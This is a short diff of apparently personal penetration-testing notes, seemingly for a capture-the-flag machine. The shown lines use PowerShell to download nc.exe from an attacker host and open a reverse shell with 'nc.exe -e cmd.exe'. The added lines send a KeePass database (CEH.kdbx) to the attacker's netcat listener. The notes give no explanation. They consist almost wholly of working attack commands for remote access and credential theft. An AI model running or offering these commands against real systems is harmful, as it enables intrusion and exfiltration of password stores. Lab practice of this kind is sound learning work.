@@ -34,10 +34,12 @@ indirect show content
 NC get session
 powershell wget "http://10.10.14.11/nc.exe" -outfile "nc.exe"
 nc.exe -e cmd.exe 10.10.14.11 1234
-
+NC copy false:
+powershell wget "http://10.10.14.11/nc.exe" -outfile "nc.exe"
+nc.exe -w 3 10.10.14.11 1234 < CEH.kdbx
 nc -nvlp 1234
 
-NC copy:
-
 nc -lp 1235>jeeves.kdbx
+
+
 
